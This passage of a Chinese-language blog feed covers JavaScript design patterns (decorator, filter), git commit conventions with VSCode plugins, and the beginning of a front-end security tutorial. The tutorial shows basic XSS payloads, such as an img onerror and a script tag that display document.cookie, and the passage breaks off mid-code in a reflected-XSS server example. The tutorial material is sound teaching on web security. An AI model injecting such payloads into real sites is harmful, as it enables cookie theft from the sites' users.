punctuation">)</span> <span class="token punctuation">{</span>       console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Shape: Circle"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>这时我们可以用装饰器来实现，假设我们要给形状添加颜色功能</p><pre class=" language-js"><code class="language-js"><span class="token keyword">class</span> <span class="token class-name">RedShapeDecorator</span> <span class="token punctuation">{</span>    <span class="token function">constructor</span><span class="token punctuation">(</span>decoratedShape<span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">this</span><span class="token punctuation">.</span>decoratedShape <span class="token operator">=</span> decoratedShape<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">this</span><span class="token punctuation">.</span>decoratedShape<span class="token punctuation">.</span><span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setRedBorder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">setRedBorder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Border Color: Red"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>那么在使用装饰器的类，在画圆的时候就实现了了画边框的颜色。</p><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> circle <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Circle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> redCircle <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RedShapeDecorator</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Circle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> redRectangle <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RedShapeDecorator</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Rectangle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Circle with normal border"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>circle<span class="token punctuation">.</span><span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"\nCircle of red border"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>redCircle<span class="token punctuation">.</span><span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"\nRectangle of red border"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>redRectangle<span class="token punctuation">.</span><span class="token function">draw</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * output: * Circle with normal border * Shape: Circle *  * Circle of red border * Shape: Circle * Border Color: Red *  * Rectangle of red border * Shape: Rectangle * Border Color: Red */</span></code></pre><h3 id="装饰器模式的优势"><a href="#装饰器模式的优势" class="headerlink" title="装饰器模式的优势"></a>装饰器模式的优势</h3><p>即使原有对象发生改变，装饰器是种非侵入式功能添加，对原有对象的影响也能降低到最小。</p><h2 id="过滤器模式-Filter-Pattern"><a href="#过滤器模式-Filter-Pattern" class="headerlink" title="过滤器模式(Filter Pattern)"></a>过滤器模式(Filter Pattern)</h2><p>通过多个单一的功能筛选构建出一个复杂的筛选功能。</p><h3 id="过滤器模式的实例"><a href="#过滤器模式的实例" class="headerlink" title="过滤器模式的实例"></a>过滤器模式的实例</h3><p>首先定义一个对象，我们后续可以通过名字(name)，性别(gender)，婚姻状况(maritalStatus)</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 定义对象</span><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>    <span class="token function">constructor</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> gender<span class="token punctuation">,</span> maritalStatus<span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>       <span class="token keyword">this</span><span class="token punctuation">.</span>gender <span class="token operator">=</span> gender<span class="token punctuation">;</span>       <span class="token keyword">this</span><span class="token punctuation">.</span>maritalStatus <span class="token operator">=</span> maritalStatus<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">getGender</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>gender<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">getMaritalStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>maritalStatus<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span></code></pre><p>定义一些单一功能的筛选条件，比如啊判断是男，是女，是不是单身。</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 添加筛选条件</span><span class="token keyword">class</span> <span class="token class-name">CriteriaMale</span> <span class="token punctuation">{</span>    <span class="token function">meetCriteria</span><span class="token punctuation">(</span>persons<span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">const</span> malePersons <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> person <span class="token keyword">of</span> persons<span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>person<span class="token punctuation">.</span><span class="token function">getGender</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"MALE"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>             malePersons<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>       <span class="token punctuation">}</span>       <span class="token keyword">return</span> malePersons<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">CriteriaFemale</span> <span class="token punctuation">{</span>    <span class="token function">meetCriteria</span><span class="token punctuation">(</span>persons<span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">const</span> femalePersons <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> person <span class="token keyword">of</span> persons<span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>person<span class="token punctuation">.</span><span class="token function">getGender</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"FEMALE"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>             femalePersons<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>       <span class="token punctuation">}</span>       <span class="token keyword">return</span> femalePersons<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">CriteriaSingle</span> <span class="token punctuation">{</span>    <span class="token function">meetCriteria</span><span class="token punctuation">(</span>persons<span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">const</span> singlePersons <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> person <span class="token keyword">of</span> persons<span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>person<span class="token punctuation">.</span><span class="token function">getMaritalStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"SINGLE"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>             singlePersons<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>       <span class="token punctuation">}</span>       <span class="token keyword">return</span> singlePersons<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>将单一功能增加对应的操作符，使单一功能筛选条件能通过组合来实现复杂的筛选。</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 添加筛选操作符</span><span class="token keyword">class</span> <span class="token class-name">AndCriteria</span> <span class="token punctuation">{</span>    <span class="token function">constructor</span><span class="token punctuation">(</span>criteria<span class="token punctuation">,</span> otherCriteria<span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">this</span><span class="token punctuation">.</span>criteria <span class="token operator">=</span> criteria<span class="token punctuation">;</span>       <span class="token keyword">this</span><span class="token punctuation">.</span>otherCriteria <span class="token operator">=</span> otherCriteria<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">meetCriteria</span><span class="token punctuation">(</span>persons<span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">const</span> firstCriteriaPersons <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>criteria<span class="token punctuation">.</span><span class="token function">meetCriteria</span><span class="token punctuation">(</span>persons<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>otherCriteria<span class="token punctuation">.</span><span class="token function">meetCriteria</span><span class="token punctuation">(</span>firstCriteriaPersons<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">class</span> <span class="token class-name">OrCriteria</span><span class="token punctuation">{</span>    <span class="token function">constructor</span><span class="token punctuation">(</span>criteria<span class="token punctuation">,</span> otherCriteria<span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">this</span><span class="token punctuation">.</span>criteria <span class="token operator">=</span> criteria<span class="token punctuation">;</span>       <span class="token keyword">this</span><span class="token punctuation">.</span>otherCriteria <span class="token operator">=</span> otherCriteria<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">meetCriteria</span><span class="token punctuation">(</span>persons<span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">const</span> firstCriteriaItems <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>criteria<span class="token punctuation">.</span><span class="token function">meetCriteria</span><span class="token punctuation">(</span>persons<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">const</span> otherCriteriaItems <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>otherCriteria<span class="token punctuation">.</span><span class="token function">meetCriteria</span><span class="token punctuation">(</span>persons<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> person <span class="token keyword">of</span> otherCriteriaItems<span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>firstCriteriaItems<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            firstCriteriaItems<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>       <span class="token punctuation">}</span>       <span class="token keyword">return</span> firstCriteriaItems<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span></code></pre><p>使用单一筛选条件或是组合单一筛选条件来筛选，达到复杂筛选目的</p><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">printPersons</span><span class="token punctuation">(</span>persons<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span>  person <span class="token keyword">of</span> persons<span class="token punctuation">)</span> <span class="token punctuation">{</span>       console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">const</span> persons <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>persons<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"Robert"</span><span class="token punctuation">,</span><span class="token string">"Male"</span><span class="token punctuation">,</span> <span class="token string">"Single"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>persons<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"John"</span><span class="token punctuation">,</span><span class="token string">"Male"</span><span class="token punctuation">,</span> <span class="token string">"Married"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>persons<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"Laura"</span><span class="token punctuation">,</span><span class="token string">"Female"</span><span class="token punctuation">,</span> <span class="token string">"Married"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>persons<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"Diana"</span><span class="token punctuation">,</span><span class="token string">"Female"</span><span class="token punctuation">,</span> <span class="token string">"Single"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>persons<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"Mike"</span><span class="token punctuation">,</span><span class="token string">"Male"</span><span class="token punctuation">,</span> <span class="token string">"Single"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>persons<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"Bobby"</span><span class="token punctuation">,</span><span class="token string">"Male"</span><span class="token punctuation">,</span> <span class="token string">"Single"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> male <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CriteriaMale</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> female <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CriteriaFemale</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> single <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CriteriaSingle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> singleMale <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AndCriteria</span><span class="token punctuation">(</span>single<span class="token punctuation">,</span> male<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> singleOrFemale <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OrCriteria</span><span class="token punctuation">(</span>single<span class="token punctuation">,</span> female<span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Males: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printPersons</span><span class="token punctuation">(</span>male<span class="token punctuation">.</span><span class="token function">meetCriteria</span><span class="token punctuation">(</span>persons<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"\nFemales: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printPersons</span><span class="token punctuation">(</span>female<span class="token punctuation">.</span><span class="token function">meetCriteria</span><span class="token punctuation">(</span>persons<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"\nSingle Males: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printPersons</span><span class="token punctuation">(</span>singleMale<span class="token punctuation">.</span><span class="token function">meetCriteria</span><span class="token punctuation">(</span>persons<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"\nSingle Or Females: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printPersons</span><span class="token punctuation">(</span>singleOrFemale<span class="token punctuation">.</span><span class="token function">meetCriteria</span><span class="token punctuation">(</span>persons<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * output: * Males:  * Person { name: 'Robert', gender: 'Male', maritalStatus: 'Single' } * Person { name: 'John', gender: 'Male', maritalStatus: 'Married' } * Person { name: 'Mike', gender: 'Male', maritalStatus: 'Single' } * Person { name: 'Bobby', gender: 'Male', maritalStatus: 'Single' } *  * Females:  * Person { name: 'Laura', gender: 'Female', maritalStatus: 'Married' } * Person { name: 'Diana', gender: 'Female', maritalStatus: 'Single' } *  * Single Males:  * Person { name: 'Robert', gender: 'Male', maritalStatus: 'Single' } * Person { name: 'Mike', gender: 'Male', maritalStatus: 'Single' } * Person { name: 'Bobby', gender: 'Male', maritalStatus: 'Single' } *  * Single Or Females:  * Person { name: 'Robert', gender: 'Male', maritalStatus: 'Single' } * Person { name: 'Diana', gender: 'Female', maritalStatus: 'Single' } * Person { name: 'Mike', gender: 'Male', maritalStatus: 'Single' } * Person { name: 'Bobby', gender: 'Male', maritalStatus: 'Single' } * Person { name: 'Laura', gender: 'Female', maritalStatus: 'Married' } */</span></code></pre><h3 id="过滤器模式优势"><a href="#过滤器模式优势" class="headerlink" title="过滤器模式优势"></a>过滤器模式优势</h3><p>在需要做类的筛选的时候，通过每次单一功能的筛选，再做聚合能极大的降低筛选功能的复杂性。</p>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>git规范与常用插件</title>
      <link href="2020/12/18/%E8%A7%84%E8%8C%83-git%E8%A7%84%E8%8C%83%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%8F%92%E4%BB%B6/"/>
      <url>2020/12/18/%E8%A7%84%E8%8C%83-git%E8%A7%84%E8%8C%83%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%8F%92%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<ul><li>git<ul><li>commit 规范</li><li>sourceTree</li><li>合并多条 commit </li></ul></li><li>VSCode 插件</li><li>vue-dev-tools</li><li>Iterm2 + oh my zsh</li></ul><h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><ul><li>git常见命令：<a href="https://blog.csdn.net/web_csdn_share/article/details/79243308" target="_blank" rel="noopener">https://blog.csdn.net/web_csdn_share/article/details/79243308</a> </li><li>git reset原理：<a href="https://www.cnblogs.com/wangwenjin2026/p/11549285.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangwenjin2026/p/11549285.html</a> </li><li>什么是fork：<a href="https://www.liaoxuefeng.com/wiki/896043488029600/900937935629664" target="_blank" rel="noopener">https://www.liaoxuefeng.com/wiki/896043488029600/900937935629664</a></li></ul><h3 id="commit-规范"><a href="#commit-规范" class="headerlink" title="commit 规范"></a>commit 规范</h3><blockquote><p><code>commitizen</code>是一个nodejs命令行工具，通过交互的方式，生成符合规范的git commit，使用如下</p></blockquote><pre class=" language-js"><code class="language-js">git add <span class="token punctuation">.</span>git cz</code></pre><h4 id="如何安装"><a href="#如何安装" class="headerlink" title="如何安装"></a>如何安装</h4><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 全局安装</span>npm install <span class="token operator">-</span>g commitizen <span class="token comment" spellcheck="true">// 或本地安装</span>$ npm install <span class="token operator">--</span>save<span class="token operator">-</span>dev commitizen<span class="token comment" spellcheck="true">// 安装适配器</span>npm install cz<span class="token operator">-</span>conventional<span class="token operator">-</span>changelog</code></pre><h3 id="sourceTree"><a href="#sourceTree" class="headerlink" title="sourceTree"></a>sourceTree</h3><ul><li>便于查看分支图表</li><li>Dark 主题</li></ul><h3 id="合并多条-commit"><a href="#合并多条-commit" class="headerlink" title="合并多条 commit"></a>合并多条 commit</h3><h4 id="git-rebase"><a href="#git-rebase" class="headerlink" title="git rebase"></a>git rebase</h4><p>参考<a href="https://www.codercto.com/a/45325.html" target="_blank" rel="noopener">这一次彻底搞懂 Git Rebase</a>，<a href="https://zhuanlan.zhihu.com/p/141871803" target="_blank" rel="noopener">完美生活：git rebase -i | Linux 中国</a>，<a href="https://www.jianshu.com/p/4a8f4af4e803" target="_blank" rel="noopener">【Git】rebase 用法小结</a></p><pre class=" language-js"><code class="language-js">git rebase <span class="token operator">-</span>i head<span class="token operator">~</span><span class="token number">3</span> <span class="token comment" spellcheck="true">// 合并最近三条commit</span></code></pre><p>弹出编辑界面</p><blockquote><p>pick b931dac 修改test2为test<br>pick efd10a0 feat: 群引流加好友时间<br>pick 860aea3 合并</p><p># commands</p><p>pick：保留该commit（缩写:p）</p><p>reword：保留该commit，但我需要修改该commit的注释（缩写:r）</p><p>edit：保留该commit, 但我要停下来修改该提交(不仅仅修改注释)（缩写:e）</p><p>squash：将该commit和前一个commit合并（缩写:s）</p><p>fixup：将该commit和前一个commit合并，但我不要保留该提交的注释信息（缩写:f）</p><p>exec：执行shell命令（缩写:x）</p><p>drop：我要丢弃该commit（缩写:d）</p></blockquote><p>我一般选择<code>rff</code>命令，使用最上面的提交并修改，后两条合并，然后继续进入编辑界面修改提交记录，:wq 退出</p><h3 id="git-reset-–soft-commitID"><a href="#git-reset-–soft-commitID" class="headerlink" title="git reset –soft [commitID]"></a>git reset –soft [commitID]</h3><blockquote><p>带 <code>--soft</code> 参数的区别在于把改动内容添加到暂存区 相当于执行了<code>git add .</code></p></blockquote><h2 id="VSCode-常用插件"><a href="#VSCode-常用插件" class="headerlink" title="VSCode 常用插件"></a>VSCode 常用插件</h2><ul><li>Git History： 查看 git 历史</li><li>Leetcode：刷题必备</li><li>Bracket Pair Colorizer：括号匹配</li><li>GitLens：在 vscode 上使用 git 功能</li><li>Chinese (Simplified) Language Pack for Visual Studio Code：中文设置</li></ul><blockquote><p>安装后，在 <code>locale.json</code> 中添加 <code>&quot;locale&quot;: &quot;zh-cn&quot;</code>，即可载入中文（简体）语言包。要修改 <code>locale.json</code>，你可以同时按下 <code>Ctrl+Shift+P</code> 打开<strong>命令面板</strong>，之后输入 “config” 筛选可用命令列表，最后选择<strong>配置语言</strong>命令。</p></blockquote><ul><li>Babel JavaScript：JavaScript 语法高亮显示</li><li>ESLint</li><li>Live Server</li><li>open in browser</li><li>Minapp：微信小程序标签、属性的智能补全</li><li>wechat-snippet：微信小程序代码辅助</li><li>wxml：微信小程序 wxml 格式化以及高亮组件</li><li>Vetur: 支持vue文件的语法高亮显示，除了支持template模板以外，还支持大多数主流的前端开发脚本和插件，比如Sass和TypeScript</li><li>vscode-icons</li><li>vue-helper插件：代码提示，函数跳转</li><li>Codelf：右键变量命名</li></ul><h2 id="vue-dev-tools"><a href="#vue-dev-tools" class="headerlink" title="vue-dev-tools"></a>vue-dev-tools</h2><blockquote><p>控制台调试 vue</p></blockquote><h2 id="Iterm2-oh-my-zsh"><a href="#Iterm2-oh-my-zsh" class="headerlink" title="Iterm2 + oh my zsh"></a>Iterm2 + oh my zsh</h2><p><a href="https://segmentfault.com/a/1190000014992947" target="_blank" rel="noopener">iTerm2 + Oh My Zsh 打造舒适终端体验</a></p>]]></content>
      
      
      <categories>
          
          <category> 规范 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>前端安全简介</title>
      <link href="2020/12/18/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%80%E4%BB%8B/"/>
      <url>2020/12/18/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8-%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<ul><li>XSS</li><li>CSRF</li><li>点击劫持</li><li>HTTP传输安全</li><li>第三方依赖安全</li><li>控制台注入代码</li><li>钓鱼</li><li>扩展</li></ul><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><blockquote><p>XSS指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的特殊目的。简单举一个例子（dom型）</p></blockquote><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">v-html</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    el<span class="token punctuation">:</span> <span class="token string">'#app'</span><span class="token punctuation">,</span>    data<span class="token punctuation">:</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// src 不存在从而触发 onerror</span>        content<span class="token punctuation">:</span> <span class="token template-string"><span class="token string">`&lt;img src="xxx" onerror="alert(document.cookie)">`</span></span>                content<span class="token punctuation">:</span> `<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>`    }})<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><h3 id="XSS危害"><a href="#XSS危害" class="headerlink" title="XSS危害"></a>XSS危害</h3><ul><li>窃取 cookie</li><li>按键记录和钓鱼</li><li>未授权操作</li><li>获取页面数据</li><li>劫持前端逻辑</li><li>偷取用户资料</li><li>…</li></ul><blockquote><p>XSS的攻击一般分为以下几类：反射型XSS，存储型XSS，DOM XSS。</p><p>反射型和存储型在纯前端渲染中已经很少见了，尤其在第三方框架下</p></blockquote><h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4><blockquote><p>用户在一个不防范 XSS 的网站中搜索内容，关键字为 XXX，如果网站内包含 XXX的内容，那么该内容就会被展示出来，如果网站中不包含相关，那么可能会提示 XXX 相关内容不存在。也就是，用户的搜索内容最终都会以某种方式反射到搜索结果中。如果搜索内容为：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，那么页面就会执行这段 JavaScript 代码，也即该网站存在 XSS 漏洞。</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// node 服务端 app.js</span><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 1. 读取渲染页面的内容</span>    <span class="token comment" spellcheck="true">// 2, 将渲染结果发送给客户端</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token 